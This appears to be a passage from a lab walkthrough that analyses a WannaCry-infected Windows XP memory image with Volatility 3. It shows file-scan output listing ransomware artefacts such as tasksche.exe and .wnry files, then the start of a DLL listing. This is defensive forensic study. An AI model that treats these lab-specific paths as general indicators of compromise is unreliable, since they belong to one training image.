0x22bad60	\WINDOWS\system32\ersvc.dll	112
0x22baf90	\WINDOWS\system32\dmserver.dll	112
0x22bb1d0	\WINDOWS\system32\certcli.dll	112
0x22bb400	\WINDOWS\system32\cryptsvc.dll	112
0x22bb7f8	\Intel\ivecuqmanpnirkt615\00000000.pky	112
0x22bb9c8	\Documents and Settings\LocalService\Local Settings\History\History.IE5\index.dat	112
0x22bbbd8	\Documents and Settings\LocalService\Cookies\index.dat	112
0x22bbde8	\Documents and Settings\LocalService\Local Settings\Temporary Internet Files\Content.IE5\index.dat	112
0x22bbf90	\WINDOWS\system32\webclnt.dll	112
0x22bc200	\net\NtControlPipe8	112
0x22bc310	\WINDOWS\system32\sfc_os.dll	112
0x22bc688	\$Directory	112
0x22bcc50	\WINDOWS\system32\midimap.dll	112
0x22bce70	\WINDOWS\system32\msacm32.drv	112
0x22bd0d0	\WINDOWS\system32\mstsc.exe	112
0x22bd2c8	\WINDOWS\system32\BrowserChoice.exe	112
0x22bd3d0	\WINDOWS\system32\odbc32.dll	112
0x22bd610	\WINDOWS\system32\mspaint.exe	112
0x22bd868	\Topology	112
0x22bdac8	\WINDOWS\system32\mydocs.dll	112
0x22bddd0	\{9B365890-165F-11D0-A195-0020AFD156E4}	112
0x22bdf90	\WINDOWS\system32\accwiz.exe	112
0x22be268	\{9B365890-165F-11D0-A195-0020AFD156E4}	112
0x22be500	\WINDOWS\system32\wdmaud.drv	112
0x22be730	\Documents and Settings\donny\Application Data\Microsoft\Protect\CREDHIST	112
0x22bea60	\$Directory	112
0x22beaf8	\Documents and Settings\donny\Application Data\Microsoft\Protect\S-1-5-21-602162358-764733703-1957994488-1003\f6ef8b17-2d2e-43f2-ad8d-55572ca41909	112
0x22becf0	\WINDOWS\system32\wkssvc.dll	112
0x22bee00	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	112
0x22bef28	\WINDOWS\system32\audiosrv.dll	112
0x22bf038	\$Directory	112
0x22bf350	\WINDOWS\system32\spoolsv.exe	112
0x22bf598	\WINDOWS\system32\msidle.dll	112
0x22bf9a0	\WINDOWS\system32\schedsvc.dll	112
0x22c0110	\WINDOWS\system32\stdole2.tlb	112
0x22c02e0	\WINDOWS\system32\vssapi.dll	112
0x22c05e8	\WINDOWS\system32\wbem\wmisvc.dll	112
0x22c08d0	\WINDOWS\Fonts\framdit.ttf	112
0x22c0b00	\WINDOWS\system32\MSIMTF.dll	112
0x22c0cf8	\WINDOWS\system32\themeui.dll	112
0x22c1028	\WINDOWS\system32\eappcfg.dll	112
0x22c10d8	\WINDOWS\system32\desk.cpl	112
0x22c12a8	\WINDOWS\system32\shdocvw.dll	112
0x22c16f0	\WINDOWS\system32\browseui.dll	112
0x22c1808	\$Directory	112
0x22c1950	\WINDOWS\Resources\Themes\Luna\luna.msstyles	112
0x22c1bf0	\WINDOWS\system32\wzcsapi.dll	112
0x22c1e20	\WINDOWS\system32\eappprxy.dll	112
0x22c2028	\Documents and Settings\donny\Start Menu\Programs\Accessories\Accessibility\Narrator.lnk	112
0x22c22d8	\WINDOWS\system32\onex.dll	112
0x22c2508	\WINDOWS\system32\dot3dlg.dll	112
0x22c26d8	\WINDOWS\system32\credui.dll	112
0x22c2930	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Communications\New Connection Wizard.lnk	112
0x22c2d60	\WINDOWS\system32\netman.dll	112
0x22c3028	\WINDOWS\system32\rasapi32.dll	112
0x22c34e0	\WINDOWS\system32\raschap.dll	112
0x22c3740	\WINDOWS\system32\riched20.dll	112
0x22c3968	\WINDOWS\Fonts\arialbi.ttf	112
0x22c3bc8	\WINDOWS\system32\tapi32.dll	112
0x22c3df8	\WINDOWS\system32\rasman.dll	112
0x22c4240	\WINDOWS\system32\adsldpc.dll	112
0x22c4480	\WINDOWS\system32\activeds.dll	112
0x22c46b8	\WINDOWS\system32\mprapi.dll	112
0x22c48e8	\WINDOWS\system32\cryptui.dll	112
0x22c4b30	\WINDOWS\system32\rastls.dll	112
0x22c4d98	\WINDOWS\system32\Microsoft\Protect\S-1-5-18\User\68fa1b6e-57a3-4316-98e3-8fa780aa107b	112
0x22c4f90	\WINDOWS\Fonts\arial.ttf	112
0x22c5290	\WINDOWS\system32\userinit.exe	112
0x22c54d0	\WINDOWS\system32\secupd.dat	112
0x22c56d0	\WINDOWS\system32\secupd.sig	112
0x22c58d0	\WINDOWS\system32\oembios.dat	112
0x22c5ad0	\WINDOWS\system32\oembios.sig	112
0x22c5cd0	\WINDOWS\system32\dpcdll.dll	112
0x22c5f90	\WINDOWS\system32\powrprof.dll	112
0x22c6c80	\WINDOWS\system32\cscui.dll	112
0x22c6f90	\$Directory	112
0x22c70e0	\WINDOWS\Web\Wallpaper\Bliss.bmp	112
0x22c72b0	\Intel\ivecuqmanpnirkt615\msg\m_english.wnry	112
0x22c74a8	\Documents and Settings\donny\Local Settings\desktop.ini	112
0x22c75b8	\WINDOWS\system32\shsvcs.dll	112
0x22c7720	\Documents and Settings\All Users\Start Menu\Windows Catalog.lnk	112
0x22c7e18	\WINDOWS\system32\shgina.dll	112
0x22c8190	\$Directory	112
0x22c8228	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x22c8448	\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools\Data Sources (ODBC).lnk	112
0x22c8668	\WINDOWS\system32\clbcatq.dll	112
0x22c8960	\WINDOWS\system32\esent.dll	112
0x22c8ab8	\Documents and Settings\donny\NTUSER.DAT.LOG	112
0x22c8e58	\WINDOWS\system32\dot3api.dll	112
0x22c90b8	\WINDOWS\system32\qutil.dll	112
0x22c9318	\WINDOWS\system32\atl.dll	112
0x22c9558	\WINDOWS\system32\eapolqec.dll	112
0x22c9728	\WINDOWS\system32\wmi.dll	112
0x22c9930	\WINDOWS\system32\rtutils.dll	112
0x22c9b60	\WINDOWS\system32\wzcsvc.dll	112
0x22c9f28	\WINDOWS\system32\lmhsvc.dll	112
0x22ca028	\WINDOWS\system32\msimg32.dll	112
0x22ca188	\WINDOWS\system32\oleaccrc.dll	112
0x22ca578	\WINDOWS\system32\winspool.drv	112
0x22ca7c0	\WINDOWS\system32\wlnotify.dll	112
0x22ca990	\WINDOWS\system32\dimsntfy.dll	112
0x22cabb8	\WINDOWS\system32\cscdll.dll	112
0x22cadf0	\WINDOWS\system32\oleacc.dll	112
0x22cb5d8	\WINDOWS\system32\duser.dll	112
0x22cb968	\WINDOWS\system32\ntkrnlpa.exe	112
0x22cbb68	\WINDOWS\Fonts\micross.ttf	112
0x22cbe00	\WINDOWS\system32\logonui.exe.manifest	112
0x22cbf90	\WINDOWS\system32\logonui.exe	112
0x22ccad8	\WINDOWS\system32\shimgvw.dll	112
0x22cd120	\Documents and Settings\donny\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat	112
0x22cf208	\WINDOWS\system32\dnsrslvr.dll	112
0x22cf3d8	\net\NtControlPipe6	112
0x22cf5d0	\WINDOWS\system32\mui\0009	112
0x22cf6e0	\WINDOWS\system32\odbcint.dll	112
0x22cf848	\Documents and Settings\donny\Local Settings\Application Data\Microsoft\Windows\UsrClass.dat.LOG	112
0x22cfbf8	\WINDOWS\system32\dhcpcsvc.dll	112
0x22cfec0	\WINDOWS\system32	112
0x22d0740	\$Directory	112
0x22d07d8	\Program Files\Common Files\System\ado	112
0x22d09d0	\WINDOWS\system32\rasadhlp.dll	112
0x22d0be0	\WINDOWS\system32\winrnr.dll	112
0x22d0e00	\WINDOWS\system32\wshtcpip.dll	112
0x22d1028	\WINDOWS\system32\config\SysEvent.Evt	112
0x22d10d8	\WINDOWS\system32\hnetcfg.dll	112
0x22d12a8	\WINDOWS\system32\mswsock.dll	112
0x22d1478	\WINDOWS\system32\ntoskrnl.exe	112
0x22d1678	\Program Files\MSN Gaming Zone\Windows	112
0x22d1870	\WINDOWS\inf	112
0x22d1a68	\Program Files\Common Files\System\Ole DB	112
0x22d1ce0	\net\NtControlPipe5	112
0x22d2120	\WINDOWS\system32\ncobjapi.dll	112
0x22d23a8	\WINDOWS\system32\config\SecEvent.Evt	112
0x22d25a0	\WINDOWS\system32\config\Internet.evt	112
0x22d28d0	\$Directory	112
0x22d2968	\WINDOWS\system32\config\AppEvent.Evt	112
0x22d2b78	\WINDOWS\system32\netevent.dll	112
0x22d2d80	\WINDOWS\system32\eventlog.dll	112
0x22d2f28	\Intel\ivecuqmanpnirkt615\tasksche.exe	112
0x22d3198	\WINDOWS\system32\rpcss.dll	112
0x22d3548	\WINDOWS\system32\ntmarta.dll	112
0x22d3780	\WINDOWS\system32\svchost.exe	112
0x22d39a0	\WINDOWS\system32\scecli.dll	112
0x22d3bd0	\WINDOWS\system32\wtsapi32.dll	112
0x22d3da0	\WINDOWS\system32\winscard.dll	112
0x22d3f90	\WINDOWS\system32\tspkg.dll	112
0x22d4240	\WINDOWS\system32\rsaenh.dll	112
0x22d4710	\WINDOWS\system32\wdigest.dll	112
0x22d48e0	\WINDOWS\system32\w32time.dll	112
0x22d4bd0	\WINDOWS\system32\netlogon.dll	112
0x22d4e00	\WINDOWS\system32\iphlpapi.dll	112
0x22d4f90	\WINDOWS\system32\msv1_0.dll	112
0x22d5598	\WINDOWS\system32\kerberos.dll	112
0x22d5850	\WINDOWS\system32\msprivs.dll	112
0x22d5a50	\WINDOWS\system32\WindowsLogon.manifest	112
0x22d5c48	\WINDOWS\system32\MSCTF.dll	112
0x22d61b0	\$Directory	112
0x22d6440	\WINDOWS\system32\msnsspc.dll	112
0x22d6610	\WINDOWS\system32\digest.dll	112
0x22d6878	\WINDOWS\system32\credssp.dll	112
0x22d6a48	\WINDOWS\system32\schannel.dll	112
0x22d6c18	\WINDOWS\system32\msvcrt40.dll	112
0x22d6de8	\WINDOWS\system32\msapsspc.dll	112
0x22d6f90	\WINDOWS\system32\uxtheme.dll	112
0x22d71c8	\WINDOWS\system32\msacm32.dll	112
0x22d7398	\WINDOWS\system32\winmm.dll	112
0x22d7568	\WINDOWS\AppPatch\AcGenral.dll	112
0x22d7840	\WINDOWS\system32\cryptdll.dll	112
0x22d7a78	\WINDOWS\system32\samsrv.dll	112
0x22d7d58	\WINDOWS\system32\samlib.dll	112
0x22d7f28	\WINDOWS\system32\dnsapi.dll	112
0x22d8388	\WINDOWS\system32\ntdsapi.dll	112
0x22d8558	\WINDOWS\AppPatch\AcAdProc.dll	112
0x22d8728	\WINDOWS\system32\shimeng.dll	112
0x22d88f8	\WINDOWS\system32\umpnpmgr.dll	112
0x22d8ac8	\WINDOWS\system32\scesrv.dll	112
0x22d8d18	\WINDOWS\system32\msvcp60.dll	112
0x22d8ec0	\WINDOWS\system32\ncobjapi.dll	112
0x22d9160	\WINDOWS\system32\lsasrv.dll	112
0x22d9330	\WINDOWS\system32\lsass.exe	112
0x22d9748	\WINDOWS\WinSxS\Policies\x86_policy.5.1.Microsoft.Windows.SystemCompatible_6595b64144ccf1df_x-ww_a0111510\5.1.2600.2000.Policy	112
0x22d9940	\WINDOWS\bootstat.dat	112
0x22d9b38	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x22d9e68	\$Directory	112
0x22da2c0	\$Directory	112
0x22da688	\$Directory	112
0x22da720	\WINDOWS\system32	112
0x22da918	\WINDOWS\system32	112
0x22dab10	\WINDOWS\system32\services.exe	112
0x22dace0	\WINDOWS\AppPatch\sysmain.sdb	112
0x22db618	\WINDOWS\system32\sfc_os.dll	112
0x22db7e8	\WINDOWS\system32\sfc.dll	112
0x22db9f8	\WINDOWS\system32\shsvcs.dll	112
0x22dbcf0	\WINDOWS\system32\odbcint.dll	112
0x22dbf00	\WINDOWS\WindowsShell.Manifest	112
0x22dc180	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202\comctl32.dll	112
0x22dc488	\$Directory	112
0x22dc520	\InitShutdown	112
0x22dc850	\$Directory	112
0x22dc8e8	\InitShutdown	112
0x22dcae0	\WINDOWS\system32\sxs.dll	112
0x22dcd50	\$Directory	112
0x22dceb8	\WINDOWS\system32\odbc32.dll	112
0x22dd168	\WINDOWS\system32\msgina.dll	112
0x22dd3b8	\WINDOWS\system32	112
0x22dd520	\WINDOWS\system32\MSCTFIME.IME	112
0x22dd6f0	\WINDOWS\Fonts\marlett.ttf	112
0x22dd8c0	\WINDOWS\Fonts\tahoma.ttf	112
0x22ddb88	\WINDOWS\Fonts\tahomabd.ttf	112
0x22ddd58	\WINDOWS\Fonts\trebucbd.ttf	112
0x22ddf28	\WINDOWS\Fonts\serife.fon	112
0x22de160	\WINDOWS\Fonts\sserife.fon	112
0x22de380	\WINDOWS\Fonts\coure.fon	112
0x22de588	\WINDOWS\Fonts\wst_swed.fon	112
0x22de788	\WINDOWS\Fonts\wst_span.fon	112
0x22de988	\WINDOWS\Fonts\wst_ital.fon	112
0x22deb88	\WINDOWS\Fonts\wst_germ.fon	112
0x22ded58	\WINDOWS\Fonts\wst_fren.fon	112
0x22def28	\WINDOWS\Fonts\wst_engl.fon	112
0x22df0e8	\WINDOWS\Fonts\wst_czec.fon	112
0x22df2b8	\WINDOWS\Fonts\symbole.fon	112
0x22df4d8	\WINDOWS\Fonts\smalle.fon	112
0x22df6a8	\WINDOWS\Fonts\modern.fon	112
0x22df878	\WINDOWS\Fonts\script.fon	112
0x22dfa80	\WINDOWS\Fonts\roman.fon	112
0x22dfc90	\WINDOWS\system32\kbdus.dll	112
0x22e0038	\$Directory	112
0x22e0278	\WINDOWS\system32\sortkey.nls	112
0x22e0488	\WINDOWS\system32\imm32.dll	112
0x22e0658	\WINDOWS\system32\ctype.nls	112
0x22e0828	\WINDOWS\system32\ws2help.dll	112
0x22e09f8	\WINDOWS\system32\ws2_32.dll	112
0x22e0c60	\WINDOWS\system32\wintrust.dll	112
0x22e0e30	\WINDOWS\system32\winsta.dll	112
0x22e1278	\WINDOWS\system32\setupapi.dll	112
0x22e1448	\WINDOWS\system32\regapi.dll	112
0x22e1680	\WINDOWS\system32\psapi.dll	112
0x22e1850	\WINDOWS\system32\netapi32.dll	112
0x22e1b60	\WINDOWS\system32\profmap.dll	112
0x22e1d30	\WINDOWS\system32\nddeapi.dll	112
0x22e1f00	\WINDOWS\system32\msasn1.dll	112
0x22e2118	\WINDOWS\system32\crypt32.dll	112
0x22e22e8	\WINDOWS\system32\authz.dll	112
0x22e2520	\WINDOWS\system32\winlogon.exe	112
0x22e2a80	\WINDOWS\Fonts\cga40woa.fon	112
0x22e2c78	\WINDOWS\Fonts\cga80woa.fon	112
0x22e2e70	\WINDOWS\Fonts\ega40woa.fon	112
0x22e39c8	\net\NtControlPipe7	112
0x22e3f90	\WINDOWS\system32\win32k.sys	112
0x22e4298	\WINDOWS\Fonts\ega80woa.fon	112
0x22e4490	\WINDOWS\Fonts\dosapp.fon	112
0x22e4858	\WINDOWS\system32\vga64k.dll	112
0x22e4a28	\WINDOWS\system32\vga256.dll	112
0x22e4bf8	\WINDOWS\system32\framebuf.dll	112
0x22e4e00	\WINDOWS\system32\vga.dll	112
0x22e4f90	\WINDOWS\Fonts\vgafix.fon	112
0x22e6560	\Documents and Settings\All Users\Start Menu\Programs\Games\Solitaire.lnk	112
0x22e67e8	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x22e7598	\WINDOWS\Fonts\vgaoem.fon	112
0x22e8208	\WINDOWS\system32\lz32.dll	112
0x22e89e8	\WINDOWS\system32\mycomput.dll	112
0x22e8e00	\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools\desktop.ini	112
0x22e8f90	\WINDOWS\system32\netrap.dll	112
0x22e9228	\Documents and Settings\donny\Start Menu\Programs\Accessories\Entertainment\desktop.ini	112
0x22e92e0	\WINDOWS\system32\ntshrui.dll	112
0x22e94b8	\Documents and Settings\donny\Local Settings\Application Data\Microsoft\CD Burning	112
0x22ea158	\WINDOWS\system32\duser.dll	112
0x22ea310	\Documents and Settings\All Users\Start Menu\Programs\Games\Internet Spades.lnk	112
0x22eaa90	\WINDOWS\system32\linkinfo.dll	112
0x22eac68	\Documents and Settings\All Users\Desktop	112
0x22eaf90	\WINDOWS\system32\mstask.dll	112
0x22eb408	\browser	112
0x22eb4a8	\WINDOWS\Registration\R000000000007.clb	112
0x22eb660	\Documents and Settings\All Users\Start Menu\Programs\Games\Internet Reversi.lnk	112
0x22eba78	\WINDOWS\system32\charmap.exe	112
0x22ec358	\Documents and Settings\All Users\Start Menu\Programs\Games\Pinball.lnk	112
0x22ec718	\Intel\ivecuqmanpnirkt615\c.wnry	112
0x22ecb80	\Documents and Settings\All Users\Start Menu\Programs\Accessories\Communications\desktop.ini	112
0x22ecf90	\WINDOWS\system32\drivers\dxg.sys	112
0x22ed0a8	\WINDOWS\Fonts\vgasys.fon	112
0x22ed530	\WINDOWS\system32\usp10.dll	112
0x22ed9c0	\WINDOWS\system32\Restore\rstrui.exe	112
0x22ee398	\WINDOWS\system32\osk.exe	112
0x22ee620	\WINDOWS\system32\sxs.dll	112
0x22ee9a8	\WINDOWS\system32\odbcad32.exe	112
0x22eeec0	\WINDOWS\system32\lpk.dll	112
0x22ef0c8	\WINDOWS\system32\FNTCACHE.DAT	112
0x22ef3e0	\WINDOWS\system32\sorttbls.nls	112
0x22ef8d8	\WINDOWS\system32\locale.nls	112
0x22f04b0	\WINDOWS\system32\unicode.nls	112
0x22f06f8	\Intel\ivecuqmanpnirkt615\msg\m_romanian.wnry	112
0x22f0840	\WINDOWS\system32\riched32.dll	112
0x22f08f8	\WINDOWS\AppPatch\AcAdProc.dll	112
0x22f0b10	\Documents and Settings\All Users\Start Menu\Programs\Accessories\desktop.ini	112
0x22f0d50	\WINDOWS\system32\winsrv.dll	112
0x22f0f28	\WINDOWS\system32\spider.exe	112
0x22f1390	\WINDOWS\system32\basesrv.dll	112
0x22f1578	\WINDOWS\system32\csrsrv.dll	112
0x22f18c8	\WINDOWS\system32\csrss.exe	112
0x22f2028	\$Directory	112
0x22f2258	\WINDOWS\system32\config\software	112
0x22f2490	\WINDOWS\system32\config\SECURITY.LOG	112
0x22f2a38	\WINDOWS\system32	112
0x22f2b70	\WINDOWS\system32\kernel32.dll	112
0x22f3028	\WINDOWS\system32\shimeng.dll	112
0x22f3510	\$Directory	112
0x22f3cb8	\WINDOWS\system32\msvcp60.dll	112
0x22f3e58	\WINDOWS\system32\drivers\dxg.sys	112
0x22f60f8	\WINDOWS\system32\lsasrv.dll	112
0x22f66a0	\Documents and Settings\donny\Start Menu\Programs\Accessories\Accessibility\Magnifier.lnk	112
0x22f6738	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x22f6978	\WINDOWS\system32\imagehlp.dll	112
0x22f6c98	\WINDOWS\system32\gdi32.dll	112
0x2328270	\WINDOWS\system32\autochk.exe	112
0x2328308	\$Directory	112
0x23286e8	\$Mft	112
0x23287f0	\$Directory	112
0x2328888	\$Directory	112
0x2328920	\WINDOWS\system32\ntdll.dll	112
0x2328b20	\net\NtControlPipe3	112
0x2328bb8	\WINDOWS\ime\CHTIME\Applets	112
0x2329450	\WINDOWS\system32\cmd.exe	112
0x2329638	\WINDOWS\system32\cmd.exe	112
0x2329aa8	\$Directory	112
0x2329f28	\WINDOWS\system32\ntvdm.exe	112
0x232a1a0	\WINDOWS\system32\msvcrt.dll	112
0x232a370	\$Directory	112
0x232a530	\Documents and Settings\All Users\Start Menu\Programs\7-Zip\7-Zip File Manager.lnk	112
0x232a5c8	\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools\Event Viewer.lnk	112
0x232a820	\WINDOWS\system32\xpsp2res.dll	112
0x232aa10	\Program Files\Windows NT\hypertrm.exe	112
0x232acd0	\WINDOWS\system32\olecnv32.dll	112
0x232b1d0	\$Directory	112
0x232b5e8	\WINDOWS\system32\wininet.dll	112
0x232b680	\WINDOWS\system32	112
0x232bb30	\WINDOWS\system32\config\default.LOG	112
0x235c3c0	\WINDOWS\AppPatch\drvmain.sdb	112
0x235cc80	\WINDOWS\system32\win32spl.dll	112
0x235e950	\$BitMap	112
0x235ede0	\WINDOWS\system32\secur32.dll	112
0x235ee78	\WINDOWS\system32\shlwapi.dll	112
0x235ef90	\$Directory	112
0x23637d8	\WINDOWS\system32\mpr.dll	112
0x23644e8	\$Directory	112
0x2364a50	\WINDOWS\system32\wldap32.dll	112
0x2364b60	\WINDOWS\system32\mpr.dll	112
0x2364e98	\WINDOWS\system32\olesvr32.dll	112
0x2365848	\WINDOWS\system32\win32k.sys	112
0x2367640	\WINDOWS\system32\shell32.dll	112
0x2368b98	\$Directory	112
0x2368cc0	\WINDOWS\system32\oleaut32.dll	112
0x2368f90	\net\NtControlPipe4	112
0x236d328	\WINDOWS\system32\userenv.dll	112
0x236d660	\WINDOWS\system32\ole32.dll	112
0x236d860	\$MftMirr	112
0x236de80	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x236df90	\WINDOWS\system32\drivers\etc\hosts	112
0x236e1b8	\WINDOWS\system32\csrss.exe	112
0x236e388	\$Directory	112
0x236ef90	\WINDOWS\system32\wow32.dll	112
0x23704f8	\$Directory	112
0x2370888	\WINDOWS\system32\config\default	112
0x2370c00	\$Directory	112
0x2370cd0	\WINDOWS\system32\urlmon.dll	112
0x2370e78	\$Directory	112
0x2370f90	\WINDOWS\system32\config\system.LOG	112
0x23711d8	\WINDOWS\system32\wininet.dll	112
0x23716e8	\$Directory	112
0x2371820	\WINDOWS\system32\url.dll	112
0x2371bb8	\WINDOWS\system32\csrsrv.dll	112
0x2371cd0	\WINDOWS\system32	112
0x2371e10	\WINDOWS\system32\comdlg32.dll	112
0x23728b0	\Program Files\Movie Maker\moviemk.exe	112
0x2372f90	\$Directory	112
0x2373438	\WINDOWS\system32\comdlg32.dll	112
0x2373550	\WINDOWS\system32\advapi32.dll	112
0x2373618	\WINDOWS\system32\sfcfiles.dll	112
0x2373708	\WINDOWS\system32\lpk.dll	112
0x2373e90	\WINDOWS\system32\ole32.dll	112
0x2373f28	\WINDOWS\system32\ntdll.dll	112
0x23753b0	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x23756b0	\WINDOWS	112
0x2375d30	\WINDOWS\system32\stobject.dll	112
0x2377078	\WINDOWS\system32\version.dll	112
0x2377298	\$Directory	112
0x23774e0	\WINDOWS\system32\iertutil.dll	112
0x2377608	\WINDOWS\system32\gdi32.dll	112
0x2377770	\WINDOWS\system32\msvcrt.dll	112
0x2377870	\WINDOWS\system32\user32.dll	112
0x2388178	\WINDOWS\system32\wuaucpl.cpl	112
0x2388488	\$Directory	112
0x2388578	\WINDOWS\system32\userenv.dll	112
0x2388748	\$Directory	112
0x2388918	\$Mft	112
0x2389168	\$Directory	112
0x2389288	\WINDOWS\system32\urlmon.dll	112
0x23895b0	\$Directory	112
0x2389f90	\$Directory	112
0x238a0b8	\WINDOWS\system32\comctl32.dll	112
0x238a150	\$Directory	112
0x238ac88	\WINDOWS\system32\ieframe.dll	112
0x238ae58	\$Directory	112
0x238b440	\WINDOWS\system32\shlwapi.dll	112
0x238b4d8	\WINDOWS\system32\wldap32.dll	112
0x2390178	\WINDOWS\system32\rpcrt4.dll	112
0x23903b0	\WINDOWS\system32\apphelp.dll	112
0x23904b0	\WINDOWS\system32\kernel32.dll	112
0x23906a8	\$Directory	112
0x2391d30	\WINDOWS\system32\smss.exe	112
0x2392238	\$Directory	112
0x2392618	\Program Files\Windows NT\Pinball\PINBALL.EXE	112
0x23927a0	\WINDOWS\system32\mobsync.exe	112
0x2392870	\Program Files\7-Zip\7zFM.exe	112
0x2393370	\WINDOWS\system32\rpcrt4.dll	112
0x2393518	\$Directory	112
0x2393d38	\WINDOWS\SoftwareDistribution\DataStore\Logs\tmp.edb	112
0x23941a8	\WINDOWS\system32\usp10.dll	112
0x2394c48	\$Directory	112
0x23952a8	\WINDOWS\system32\iertutil.dll	112
0x23954b8	\WINDOWS\system32\olecli32.dll	112
0x23956a8	\WINDOWS\system32\version.dll	112
0x2395830	\WINDOWS\system32\config\AppEvent.Evt	112
0x2395bc0	\WINDOWS\system32\user32.dll	112
0x2395f90	\WINDOWS\system32\olethk32.dll	112
0x239a3d0	\$Directory	112
0x239b410	\WINDOWS\system32\comctl32.dll	112
0x239b5c0	\$Directory	112
0x239b6d0	\$Directory	112
0x239b928	\WINDOWS\system32\config\SAM.LOG	112
0x239bb80	\WINDOWS\system32\config\SAM	112
0x239c690	\WINDOWS\system32\sfcfiles.dll	112
0x239c790	\$Directory	112
0x239f478	\WINDOWS\system32\dfrgres.dll	112
0x239f6d0	\Documents and Settings\donny\Desktop	112
0x239f928	\Documents and Settings\donny\PrintHood	112
0x239fb80	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x239fc78	\$Directory	112
0x239ff28	\WINDOWS\system32	112
0x23a0238	\WINDOWS\system32\tourstart.exe	112
0x23a0370	\WINDOWS\hh.exe	112
0x23a0788	\Documents and Settings\All Users\Start Menu\Microsoft Update.lnk	112
0x23a0820	\WINDOWS\system32\msxml3.dll	112
0x23a0cd0	\WINDOWS\WinSxS\x86_Microsoft.Windows.Common-Controls_6595b64144ccf1df_6.0.2600.6028_x-ww_61e65202	112
0x23a1aa0	\Program Files\MSN Gaming Zone\Windows\shvlzm.exe	112
0x23a1c28	\Documents and Settings\donny\Desktop\PIL-1.1.7.win32-py2.7.exe	112
0x23a2330	\WINDOWS\system32\sol.exe	112
0x23a2aa0	\WINDOWS\system32\usmt\migwiz.exe	112
0x23a2bc0	\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools\Component Services.lnk	112
0x23a2c90	\Program Files\Windows NT\Accessories\wordpad.exe	112
0x23a72f8	\$Directory	112
0x23a7458	\WINDOWS\system32\ieframe.dll	112
0x23a7558	\WINDOWS\system32\advapi32.dll	112
0x23aa0c0	\WINDOWS\system32\autochk.exe	112
0x23aa360	\WINDOWS\system32\basesrv.dll	112
0x23aa668	\WINDOWS\system32\winsrv.dll	112
0x23aac88	\WINDOWS\system32\apphelp.dll	112
0x23aadc0	\$Directory	112
0x23aae58	\WINDOWS\system32\normaliz.dll	112
0x23cd490	\WINDOWS\system32\mlang.dll	112
0x23ce268	\WINDOWS\system32\normaliz.dll	112
0x23ce300	\$Directory	112
0x23ce698	\WINDOWS\system32\imagehlp.dll	112
0x23ceb60	\$LogFile	112
0x23cec88	\$Directory	112
0x23ced58	\WINDOWS\system32\oleaut32.dll	112
0x23cee58	\WINDOWS\system32\secur32.dll	112
0x23cef90	\$Directory	112
0x23eb8e8	\{9B365890-165F-11D0-A195-0020AFD156E4}	112
```

Thats alot of results.


#### `windows.dlllist.DllList`

This will show all the DLL's, again, this will bea big one. 

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.dlllist.DllList
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                        
PID	Process	Base	Size	Name	Path	LoadTime	File output

348	smss.exe	0x48580000	0xf000	smss.exe	\SystemRoot\System32\smss.exe	N/A	Disabled
348	smss.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
596	csrss.exe	0x4a680000	0x5000	csrss.exe	\??\C:\WINDOWS\system32\csrss.exe	N/A	Disabled
596	csrss.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
596	csrss.exe	0x75b40000	0xb000	CSRSRV.dll	C:\WINDOWS\system32\CSRSRV.dll	N/A	Disabled
596	csrss.exe	0x75b50000	0x10000	basesrv.dll	C:\WINDOWS\system32\basesrv.dll	N/A	Disabled
596	csrss.exe	0x75b60000	0x4b000	winsrv.dll	C:\WINDOWS\system32\winsrv.dll	N/A	Disabled
596	csrss.exe	0x77f10000	0x49000	GDI32.dll	C:\WINDOWS\system32\GDI32.dll	N/A	Disabled
596	csrss.exe	0x7c800000	0xf6000	KERNEL32.dll	C:\WINDOWS\system32\KERNEL32.dll	N/A	Disabled
596	csrss.exe	0x7e410000	0x91000	USER32.dll	C:\WINDOWS\system32\USER32.dll	N/A	Disabled
596	csrss.exe	0x629c0000	0x9000	LPK.DLL	C:\WINDOWS\system32\LPK.DLL	N/A	Disabled
596	csrss.exe	0x74d90000	0x6b000	USP10.dll	C:\WINDOWS\system32\USP10.dll	N/A	Disabled
596	csrss.exe	0x77dd0000	0x9b000	ADVAPI32.dll	C:\WINDOWS\system32\ADVAPI32.dll	N/A	Disabled
596	csrss.exe	0x77e70000	0x93000	RPCRT4.dll	C:\WINDOWS\system32\RPCRT4.dll	N/A	Disabled
596	csrss.exe	0x77fe0000	0x11000	Secur32.dll	C:\WINDOWS\system32\Secur32.dll	N/A	Disabled
596	csrss.exe	0x7e720000	0xb0000	sxs.dll	C:\WINDOWS\system32\sxs.dll	N/A	Disabled
620	winlogon.exe	0x1000000	0x81000	winlogon.exe	\??\C:\WINDOWS\system32\winlogon.exe	N/A	Disabled
620	winlogon.exe	0x7c900000	0xb2000	ntdll.dll	C:\WINDOWS\system32\ntdll.dll	N/A	Disabled
